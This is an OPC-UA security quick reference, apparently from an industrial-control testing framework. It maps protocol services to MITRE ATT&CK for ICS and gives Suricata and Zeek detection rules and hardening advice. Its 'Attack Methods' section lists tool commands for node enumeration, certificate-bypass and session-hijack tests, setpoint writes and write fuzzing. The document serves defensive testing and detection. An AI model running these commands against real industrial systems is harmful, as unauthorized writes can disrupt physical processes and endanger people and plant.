# OPC-UA Protocol Quick Reference

## Protocol Overview
- **Protocol**: OPC Unified Architecture (OPC-UA)
- **Port**: TCP/4840 (default), configurable
- **OSI Layer**: Application Layer
- **Specification**: IEC 62541
- **Primary Use**: Industrial automation, SCADA, cross-platform M2M

## Attack Tool Reference
**Implementation**: `tools/opcua_security_framework/opcua_exploit.py`
**Version**: 1.0
**Testing Guide**: `tools/opcua_security_framework/TESTING.md`

## Security Policies
| Policy | Encryption | Signature | Security Level |
|--------|-----------|-----------|----------------|
| None | No | No | Unsecured |
| Basic128Rsa15 | RSA-1.5, AES-128 | HMAC-SHA1 | Deprecated |
| Basic256 | RSA-OAEP, AES-256 | HMAC-SHA1 | Legacy |
| Basic256Sha256 | RSA-OAEP, AES-256 | HMAC-SHA256 | Good |
| Aes128_Sha256_RsaOaep | RSA-OAEP, AES-128-GCM | HMAC-SHA256 | Strong |
| Aes256_Sha256_RsaPss | RSA-PSS, AES-256-GCM | HMAC-SHA256 | Strongest |

**Reference**: `opcua_exploit.py:71-78`

## Message Security Modes
| Mode | Value | Description | Use Case |
|------|-------|-------------|----------|
| Invalid | 0 | Invalid mode | - |
| None | 1 | No encryption/signature | Local testing only |
| Sign | 2 | Signature only | Integrity without confidentiality |
| SignAndEncrypt | 3 | Full security | Production systems |

**Reference**: `opcua_exploit.py:81-86`

## Node Classes
| Class | Value | Purpose | Examples |
|-------|-------|---------|----------|
| Unspecified | 0 | Unknown | - |
| Object | 1 | Organizational structure | FolderType, ServerType |
| Variable | 2 | Data values | Temperature, Pressure |
| Method | 4 | Callable functions | Start(), Stop() |
| ObjectType | 8 | Object templates | BaseObjectType |
| VariableType | 16 | Variable templates | DataType definitions |
| ReferenceType | 32 | Relationship definitions | Organizes, HasComponent |
| DataType | 64 | Type system | Int32, String, Structure |
| View | 128 | Navigation | Custom views |

**Reference**: `opcua_exploit.py:89-99`

## Standard Services

### Discovery Services
| Service | Purpose | MITRE |
|---------|---------|-------|
| FindServers | Discover OPC-UA servers | T0888 |
| GetEndpoints | Enumerate endpoints | T0888, T0868 |
| FindServersOnNetwork | Network-wide discovery | T0888 |
| RegisterServer | Server registration | - |

### Session Services
| Service | Purpose | MITRE |
|---------|---------|-------|
| CreateSession | Establish session | - |
| ActivateSession | Authenticate session | T0859 |
| CloseSession | Terminate session | - |

### Node Management Services
| Service | Purpose | MITRE |
|---------|---------|-------|
| Browse | Navigate address space | T0801, T0861 |
| BrowseNext | Continue browsing | T0861 |
| TranslateBrowsePathsToNodeIds | Path resolution | T0861 |

### Attribute Services
| Service | Purpose | MITRE |
|---------|---------|-------|
| Read | Read node attributes | T0801, T0861 |
| Write | Write node values | T0855, T0836 |
| HistoryRead | Read historical data | T0802 |
| HistoryUpdate | Modify historical data | T0873 |

### Subscription Services
| Service | Purpose | MITRE |
|---------|---------|-------|
| CreateSubscription | Monitor data changes | T0801, T0802 |
| ModifySubscription | Adjust subscription | - |
| DeleteSubscription | Remove subscription | - |
| CreateMonitoredItems | Add items to subscription | T0801 |
| DeleteMonitoredItems | Remove monitored items | - |

### Method Services
| Service | Purpose | MITRE |
|---------|---------|-------|
| Call | Execute server methods | T0871 |

## Attack Methods

### 1. Endpoint Discovery
```bash
# Discover all OPC-UA endpoints
python3 opcua_exploit.py --target opc.tcp://192.168.1.10:4840 discover-endpoints --output endpoints.json

# Test for SecurityPolicy None
python3 opcua_exploit.py --target opc.tcp://192.168.1.10:4840 discover-endpoints --filter-policy None
```
**MITRE**: T0888 (Remote System Discovery), T0868 (Detect Operating Mode)
**Tool Reference**: `opcua_exploit.py:250-320`

### 2. Node Enumeration
```bash
# Recursive address space enumeration
python3 opcua_exploit.py --target opc.tcp://192.168.1.10:4840 enumerate-nodes \
  --start-node "ns=2;i=1" --max-depth 5 --output nodes.json

# Enumerate specific object types
python3 opcua_exploit.py --target opc.tcp://192.168.1.10:4840 enumerate-nodes \
  --node-class Variable --output variables.json
```
**MITRE**: T0801 (Monitor Process State), T0861 (Point & Tag Identification)
**Tool Reference**: `opcua_exploit.py:350-450`

### 3. Certificate Bypass Testing
```bash
# Test certificate validation bypass
python3 opcua_exploit.py --target opc.tcp://192.168.1.10:4840 test-cert-bypass \
  --self-signed --output bypass_results.json
```
**MITRE**: T0819 (Exploit Public-Facing Application)
**Tool Reference**: `opcua_exploit.py:500-600`

### 4. Subscription Manipulation
```bash
# Create malicious subscription
python3 opcua_exploit.py --target opc.tcp://192.168.1.10:4840 create-subscription \
  --nodes "ns=2;s=Temperature,ns=2;s=Pressure" --interval 100
```
**MITRE**: T0801 (Monitor Process State), T0855 (Unauthorized Command Message)
**Tool Reference**: `opcua_exploit.py:650-750`

### 5. Node Write Operations
```bash
# Write unauthorized values
python3 opcua_exploit.py --target opc.tcp://192.168.1.10:4840 write-node \
  --node "ns=2;s=Setpoint" --value 9999 --datatype Int32
```
**MITRE**: T0855 (Unauthorized Command Message), T0836 (Modify Parameter)
**Tool Reference**: `opcua_exploit.py:450-500`

### 6. Session Hijacking
```bash
# Test session token reuse
python3 opcua_exploit.py --target opc.tcp://192.168.1.10:4840 test-session-hijack \
  --capture-token --output session_tokens.json
```
**MITRE**: T0819 (Exploit Public-Facing Application)
**Tool Reference**: `opcua_exploit.py:800-900`

### 7. Protocol Fuzzing
```bash
# Fuzz node write with malformed data
python3 opcua_exploit.py --target opc.tcp://192.168.1.10:4840 fuzz-node-write \
  --node "ns=2;s=Control" --iterations 1000
```
**MITRE**: T0855 (Unauthorized Command Message)
**Tool Reference**: `opcua_exploit.py:750-800`

### 8. Security Assessment
```bash
# Comprehensive security assessment
python3 opcua_exploit.py --target opc.tcp://192.168.1.10:4840 assess-security \
  --output assessment_report.json
```
**MITRE**: T0888 (Remote System Information Discovery)
**Tool Reference**: `opcua_exploit.py:900-1000`

## Detection Signatures

### Suricata Rules
**File**: `configs/suricata_rules/opcua_detection.rules`

```
# OPC-UA endpoint discovery
alert tcp any any -> any 4840 (msg:"ICS: OPC-UA Endpoint Discovery"; \
    content:"GetEndpointsRequest"; nocase; \
    reference:url,attack.mitre.org/techniques/T0888; \
    classtype:industrial-protocol; sid:410001; rev:1;)

# Insecure session creation (SecurityMode=None)
alert tcp any any -> any 4840 (msg:"ICS: OPC-UA Insecure Session Creation"; \
    content:"CreateSessionRequest"; nocase; content:"SecurityMode"; nocase; \
    content:"|00 00 00 01|"; distance:0; within:50; \
    reference:url,attack.mitre.org/techniques/T0819; \
    classtype:industrial-protocol; sid:410002; rev:1; priority:1;)

# Recursive node enumeration via Browse
alert tcp any any -> any 4840 (msg:"ICS: OPC-UA Recursive Browse Operation"; \
    content:"BrowseRequest"; nocase; \
    threshold: type threshold, track by_src, count 10, seconds 30; \
    reference:url,attack.mitre.org/techniques/T0861; \
    classtype:industrial-protocol; sid:410003; rev:1;)

# Unauthorized Write service
alert tcp any any -> any 4840 (msg:"ICS: OPC-UA Unauthorized Write"; \
    content:"WriteRequest"; nocase; \
    reference:url,attack.mitre.org/techniques/T0855; \
    classtype:industrial-protocol; sid:410004; rev:1; priority:2;)

# High-rate subscription creation
alert tcp any any -> any 4840 (msg:"ICS: OPC-UA Subscription Manipulation"; \
    content:"CreateSubscriptionRequest"; nocase; \
    threshold: type threshold, track by_src, count 5, seconds 60; \
    reference:url,attack.mitre.org/techniques/T0801; \
    classtype:industrial-protocol; sid:410005; rev:1;)

# Method call service (remote execution)
alert tcp any any -> any 4840 (msg:"ICS: OPC-UA Method Call"; \
    content:"CallRequest"; nocase; \
    reference:url,attack.mitre.org/techniques/T0871; \
    classtype:industrial-protocol; sid:410006; rev:1; priority:2;)

# Session hijacking detection
alert tcp any any -> any 4840 (msg:"ICS: OPC-UA Potential Session Hijacking"; \
    content:"ActivateSessionRequest"; nocase; \
    threshold: type threshold, track by_dst, count 3, seconds 10; \
    reference:url,attack.mitre.org/techniques/T0819; \
    classtype:industrial-protocol; sid:410007; rev:1; priority:1;)

# Certificate validation bypass
alert tcp any any -> any 4840 (msg:"ICS: OPC-UA Certificate Validation Bypass"; \
    content:"CreateSessionRequest"; nocase; \
    pcre:"/SelfSigned|InvalidCert|UntrustedCert/i"; \
    classtype:industrial-protocol; sid:410008; rev:1; priority:1;)

# Fuzzing with malformed write values
alert tcp any any -> any 4840 (msg:"ICS: OPC-UA Protocol Fuzzing Detected"; \
    content:"WriteRequest"; nocase; dsize:>1000; \
    threshold: type threshold, track by_src, count 5, seconds 10; \
    classtype:industrial-protocol; sid:410009; rev:1;)

# Multi-service reconnaissance
alert tcp any any -> any 4840 (msg:"ICS: OPC-UA Multi-Service Reconnaissance"; \
    content:"FindServersRequest"; nocase; \
    threshold: type threshold, track by_src, count 3, seconds 30; \
    classtype:industrial-protocol; sid:410010; rev:1;)

# Historical data access
alert tcp any any -> any 4840 (msg:"ICS: OPC-UA Historical Data Access"; \
    content:"HistoryReadRequest"; nocase; \
    reference:url,attack.mitre.org/techniques/T0802; \
    classtype:industrial-protocol; sid:410011; rev:1;)

# Persistent session detection
alert tcp any any -> any 4840 (msg:"ICS: OPC-UA Long-Duration Session"; \
    flow:established,to_server; threshold: type threshold, track by_src, \
    count 1, seconds 3600; \
    classtype:industrial-protocol; sid:410012; rev:1;)
```

### Zeek Detection
**File**: `configs/zeek/opcua_monitor.zeek`

```zeek
module OPCUA_Monitor;

export {
    redef enum Log::ID += { LOG };
    
    type Info: record {
        ts: time &log;
        uid: string &log;
        id: conn_id &log;
        service_type: string &log;
        operation: string &log;
        severity: string &log;
        details: string &log;
    };
}

# Endpoint discovery tracking
global endpoint_discovery: table[addr] of count &create_expire=30sec;

event opcua_service(c: connection, service: string) {
    if (service == "GetEndpoints") {
        if (c$id$orig_h !in endpoint_discovery) {
            endpoint_discovery[c$id$orig_h] = 0;
        }
        endpoint_discovery[c$id$orig_h] += 1;
        
        Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
            $service_type=service, $operation="ENDPOINT_DISCOVERY",
            $severity="MEDIUM", $details=fmt("Discovery count: %d", endpoint_discovery[c$id$orig_h])]);
    }
}

# Insecure session detection (SecurityMode=None)
event opcua_create_session(c: connection, security_mode: count, security_policy: string) {
    if (security_mode == 1) {  # MessageSecurityMode.NONE
        Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
            $service_type="CreateSession", $operation="INSECURE_SESSION",
            $severity="CRITICAL", $details=fmt("SecurityMode=None, Policy=%s", security_policy)]);
    }
}

# Recursive Browse operation counting
global browse_count: table[addr] of count &create_expire=30sec;

event opcua_browse(c: connection, node_id: string) {
    if (c$id$orig_h !in browse_count) {
        browse_count[c$id$orig_h] = 0;
    }
    browse_count[c$id$orig_h] += 1;
    
    if (browse_count[c$id$orig_h] >= 10) {
        Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
            $service_type="Browse", $operation="RECURSIVE_ENUMERATION",
            $severity="HIGH", $details=fmt("Browse operations: %d in 30s", browse_count[c$id$orig_h])]);
    }
}

# Unauthorized Write detection
event opcua_write(c: connection, node_id: string, value: string) {
    Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
        $service_type="Write", $operation="UNAUTHORIZED_WRITE",
        $severity="HIGH", $details=fmt("Node: %s, Value: %s", node_id, value)]);
}

# Subscription manipulation monitoring
global subscription_count: table[addr] of count &create_expire=60sec;

event opcua_create_subscription(c: connection, interval: count) {
    if (c$id$orig_h !in subscription_count) {
        subscription_count[c$id$orig_h] = 0;
    }
    subscription_count[c$id$orig_h] += 1;
    
    if (subscription_count[c$id$orig_h] >= 5) {
        Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
            $service_type="CreateSubscription", $operation="SUBSCRIPTION_MANIPULATION",
            $severity="HIGH", $details=fmt("Subscriptions: %d in 60s, Interval: %d ms", 
                                          subscription_count[c$id$orig_h], interval)]);
    }
}

# Method call tracking
event opcua_call(c: connection, method_id: string, object_id: string) {
    Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
        $service_type="Call", $operation="METHOD_EXECUTION",
        $severity="HIGH", $details=fmt("Method: %s, Object: %s", method_id, object_id)]);
}

# Session hijacking detection
global session_activations: table[addr, addr] of count &create_expire=10sec;

event opcua_activate_session(c: connection, session_id: string) {
    local key: table[addr, addr] of count;
    key[c$id$orig_h, c$id$resp_h] = 0;
    
    if ([c$id$orig_h, c$id$resp_h] !in session_activations) {
        session_activations[c$id$orig_h, c$id$resp_h] = 0;
    }
    session_activations[c$id$orig_h, c$id$resp_h] += 1;
    
    if (session_activations[c$id$orig_h, c$id$resp_h] >= 3) {
        Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
            $service_type="ActivateSession", $operation="SESSION_HIJACKING",
            $severity="CRITICAL", $details=fmt("Session activations: %d in 10s", 
                                              session_activations[c$id$orig_h, c$id$resp_h])]);
    }
}

# Certificate validation error tracking
event opcua_certificate_error(c: connection, error_type: string) {
    local severity = "HIGH";
    if (error_type == "BadCertificateUntrusted" || error_type == "BadSecurityChecksFailed") {
        severity = "CRITICAL";
    }
    
    Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
        $service_type="Certificate", $operation="CERT_VALIDATION_ERROR",
        $severity=severity, $details=error_type]);
}

# Historical data access monitoring
event opcua_history_read(c: connection, node_ids: vector of string, start_time: time, end_time: time) {
    Log::write(LOG, [$ts=network_time(), $uid=c$uid, $id=c$id,
        $service_type="HistoryRead", $operation="HISTORICAL_DATA_ACCESS",
        $severity="MEDIUM", $details=fmt("Nodes: %d, Range: %s to %s", 
                                        |node_ids|, start_time, end_time)]);
}
```

## MITRE ATT&CK Mapping

### Reconnaissance (Tactic: TA0043)
- **T0888**: Remote System Information Discovery
  - Methods: discover_endpoints(), FindServers, assess_security_configuration()
- **T0801**: Monitor Process State
  - Methods: enumerate_nodes(), CreateSubscription, Read
- **T0868**: Detect Operating Mode
  - Methods: GetEndpoints, Identity queries

### Discovery (Tactic: TA0102)
- **T0861**: Point & Tag Identification
  - Methods: Browse, enumerate_nodes(), TranslateBrowsePathsToNodeIds

### Lateral Movement (Tactic: TA0109)
- **T0819**: Exploit Public-Facing Application
  - Methods: test_certificate_bypass(), test_session_hijacking()

### Collection (Tactic: TA0100)
- **T0802**: Automated Collection
  - Methods: CreateSubscription, HistoryRead

### Command and Control (Tactic: TA0011)
- **T0885**: Commonly Used Port
  - Port: TCP/4840

### Execution (Tactic: TA0104)
- **T0871**: Execution through API
  - Methods: Call (method execution)

### Impact (Tactic: TA0105)
- **T0855**: Unauthorized Command Message
  - Methods: Write, fuzz_node_write(), create_malicious_subscription()
- **T0836**: Modify Parameter
  - Methods: Write service

### Persistence (Tactic: TA0110)
- **T0873**: Project File Infection
  - Methods: HistoryUpdate (historical data modification)

### Credential Access (Tactic: TA0006)
- **T0859**: Valid Accounts
  - Methods: ActivateSession with stolen credentials

## Common Vulnerabilities

### Insecure Endpoints (SecurityPolicy=None)
- **Issue**: Servers expose unsecured endpoints
- **Impact**: No encryption, no authentication
- **Mitigation**: Disable SecurityPolicy=None, require Basic256Sha256+

### Weak Certificate Validation
- **Issue**: Servers accept self-signed or untrusted certificates
- **Impact**: Man-in-the-middle attacks possible
- **Mitigation**: Strict certificate validation, use certificate chains

### Anonymous Authentication
- **Issue**: Servers allow anonymous sessions
- **Impact**: Unrestricted read/write access
- **Mitigation**: Require username/password or certificate authentication

### Excessive Permissions
- **Issue**: All nodes writable by authenticated users
- **Impact**: Critical parameter modification
- **Mitigation**: Implement node-level access control

### Historical Data Manipulation
- **Issue**: HistoryUpdate service available
- **Impact**: Process data falsification
- **Mitigation**: Disable HistoryUpdate, audit trail integrity

## Defense Recommendations

### Network Layer
1. **Segmentation**: Isolate OPC-UA servers from IT networks
2. **Firewall Rules**: Restrict TCP/4840 to authorized clients
3. **IDS/IPS**: Deploy Suricata rules for OPC-UA monitoring
4. **TLS Inspection**: Monitor encrypted traffic via proxies

### Server Configuration
1. **Security Policies**: Require Basic256Sha256 or stronger
2. **Message Security**: Enforce SignAndEncrypt mode
3. **Certificate Management**: Use CA-signed certificates only
4. **Authentication**: Disable anonymous, require strong credentials
5. **Node Access Control**: Implement read/write permissions per node

### Application Layer
1. **Endpoint Filtering**: Disable unused endpoints
2. **Service Restrictions**: Disable HistoryUpdate if not required
3. **Rate Limiting**: Limit Browse/Read requests per client
4. **Audit Logging**: Log all Write and Call operations

### Operational
1. **Baseline Monitoring**: Establish normal OPC-UA traffic patterns
2. **Certificate Revocation**: Implement CRL/OCSP checking
3. **Change Management**: Document all server configuration changes
4. **Incident Response**: Define procedures for unauthorized access

## Protocol Limits
- **Max Nodes per Browse**: 1000 (configurable)
- **Max MonitoredItems per Subscription**: 10000 (configurable)
- **Max Session Timeout**: 3600 seconds (default)
- **Max Message Size**: 16 MB (default, configurable)
- **Max ArrayLength**: 65536 elements (default)

## Testing Checklist

### Reconnaissance Testing
- [ ] Endpoint discovery (GetEndpoints)
- [ ] FindServers enumeration
- [ ] Security policy identification
- [ ] Certificate chain analysis
- [ ] Anonymous access testing

### Enumeration Testing
- [ ] Recursive Browse operations
- [ ] Node class filtering
- [ ] Namespace enumeration
- [ ] Method discovery
- [ ] HistoryRead capability testing

### Authentication Testing
- [ ] Anonymous session creation
- [ ] Weak password testing
- [ ] Certificate bypass attempts
- [ ] Session token capture
- [ ] Session hijacking validation

### Authorization Testing
- [ ] Unauthorized Write operations
- [ ] Method call execution
- [ ] HistoryUpdate attempts
- [ ] Subscription manipulation
- [ ] Node access control bypass

### Security Assessment
- [ ] SecurityPolicy=None detection
- [ ] Certificate validation strength
- [ ] Authentication mechanism review
- [ ] Access control matrix
- [ ] Audit log verification

### Detection Validation
- [ ] Suricata rule triggering
- [ ] Zeek log generation
- [ ] SIEM alert verification
- [ ] False positive analysis
- [ ] PCAP validation

## References
- IEC 62541 (OPC-UA Specification)
- OPC Foundation Security Guidelines
- MITRE ATT&CK for ICS: https://attack.mitre.org/matrices/ics/
- Implementation: `tools/opcua_security_framework/opcua_exploit.py`
- Detection Rules: `configs/suricata_rules/opcua_detection.rules`
- Zeek Monitor: `configs/zeek/opcua_monitor.zeek`
- Testing Guide: `tools/opcua_security_framework/TESTING.md`
